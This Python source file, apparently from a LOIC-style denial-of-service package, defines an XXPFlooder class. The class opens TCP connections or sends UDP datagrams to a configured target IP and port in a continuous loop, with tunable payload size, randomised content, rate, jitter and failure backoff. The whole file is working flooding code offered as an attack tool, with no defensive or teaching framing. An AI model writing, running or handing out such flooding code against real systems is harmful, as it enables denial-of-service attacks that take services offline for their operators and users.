from __future__ import annotations

import asyncio
import logging
import socket
import time

from loic.flooders.base import AsyncFlooder
from loic.config import AttackConfig
from loic.functions import build_tcp_payload
from loic.req_state import ReqState

logger = logging.getLogger(__name__)


class XXPFlooder(AsyncFlooder):
    def __init__(self, config: AttackConfig):
        super().__init__()
        self.ip = config.target_ip
        self.port = config.port
        self.protocol = config.method
        self._delay = config.delay
        self.resp = config.wait_reply
        self.data = config.data
        self.random_msg = config.random_msg
        self.ipv6 = config.ipv6
        self.payload_size = config.payload_size
        self.jitter = config.jitter
        self.rate_limit = config.rate_limit
        self._consecutive_failures: int = 0
        self._backoff_until: float = 0.0

    async def _run(self):
        if self.protocol == 1:
            await self._tcp_flood()
        elif self.protocol == 2:
            await self._udp_flood()

    async def _tcp_flood(self):
        family = socket.AF_INET6 if self.ipv6 else socket.AF_INET
        delay_sec = (self._delay + 1) / 1000.0 if self._delay >= 0 else 0.001
        timeout_sec = 30.0
        payload_base = build_tcp_payload(self.data, self.random_msg, min_length=self.payload_size)

        while self._is_flooding:
            if time.monotonic() < self._backoff_until:
                await asyncio.sleep(0.5)
                continue

            self.state = ReqState.CONNECTING
            t_start = time.monotonic()

            try:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(self.ip, self.port, family=family),
                    timeout=timeout_sec,
                )

                self.state = ReqState.REQUESTING

                while self._is_flooding:
                    payload = build_tcp_payload(self.data, self.random_msg, min_length=self.payload_size) if self.random_msg else payload_base
                    writer.write(payload)
                    await writer.drain()
                    self.requested += 1
                    self.bytes_sent += len(payload)
                    latency = time.monotonic() - t_start
                    self.record_latency(latency)

                    if self.resp:
                        try:
                            data = await asyncio.wait_for(reader.read(4096), timeout=5.0)
                            if data:
                                self.downloaded += 1
                                self.bytes_received += len(data)
                            else:
                                break
                        except asyncio.TimeoutError:
                            self.downloaded += 1
                        except (ConnectionResetError, BrokenPipeError):
                            break

                    self.state = ReqState.COMPLETED
                    self._consecutive_failures = 0

                    if self.rate_limit > 0:
                        await asyncio.sleep(max(0.001, 1.0 / self.rate_limit))
                    elif delay_sec > 0:
                        jitter_sec = self.jitter * 0.001 * (time.monotonic() % 1) if self.jitter > 0 else 0
                        await asyncio.sleep(delay_sec + jitter_sec)

            except asyncio.TimeoutError:
                self.failed += 1
                self.state = ReqState.FAILED
                self._consecutive_failures += 1
                self._check_backoff()
            except (ConnectionRefusedError, ConnectionResetError, BrokenPipeError, OSError) as e:
                self.failed += 1
                self.state = ReqState.FAILED
                self._consecutive_failures += 1
                self._check_backoff()
                logger.debug("TCP connection error: %s", e)
            except asyncio.CancelledError:
                raise
            except Exception as e:
                self.failed += 1
                self.state = ReqState.FAILED
                logger.debug("TCP unexpected error: %s", e)
            finally:
                try:
                    if 'writer' in dir() and writer:
                        writer.close()
                        await writer.wait_closed()
                except Exception:
                    pass

            self.state = ReqState.IDLE

    async def _udp_flood(self):
        family = socket.AF_INET6 if self.ipv6 else socket.AF_INET
        delay_sec = (self._delay + 1) / 1000.0 if self._delay >= 0 else 0.001
        addr = (self.ip, self.port)
        loop = asyncio.get_event_loop()

        while self._is_flooding:
            if time.monotonic() < self._backoff_until:
                await asyncio.sleep(0.5)
                continue

            self.state = ReqState.REQUESTING
            payload = build_tcp_payload(self.data, self.random_msg, min_length=self.payload_size)

            try:
                sock = socket.socket(family, socket.SOCK_DGRAM)
                sock.setblocking(False)

                await loop.sock_sendto(sock, payload, addr)
                self.requested += 1
                self.bytes_sent += len(payload)
                self._consecutive_failures = 0

                if self.resp:
                    sock.settimeout(5.0)
                    try:
                        data, _ = sock.recvfrom(4096)
                        self.downloaded += 1
                        self.bytes_received += len(data)
                    except socket.timeout:
                        self.downloaded += 1
                    except OSError:
                        pass

                self.state = ReqState.COMPLETED

            except OSError as e:
                self.failed += 1
                self.state = ReqState.FAILED
                self._consecutive_failures += 1
                self._check_backoff()
                logger.debug("UDP send error: %s", e)
            except asyncio.CancelledError:
                raise
            finally:
                try:
                    sock.close()
                except Exception:
                    pass

            self.state = ReqState.IDLE

            if self.rate_limit > 0:
                await asyncio.sleep(max(0.001, 1.0 / self.rate_limit))
            elif delay_sec > 0:
                jitter_sec = self.jitter * 0.001 * (time.monotonic() % 1) if self.jitter > 0 else 0
                await asyncio.sleep(delay_sec + jitter_sec)

    def _check_backoff(self):
        if self._consecutive_failures >= 50:
            self._backoff_until = time.monotonic() + 5.0
            self._consecutive_failures = 0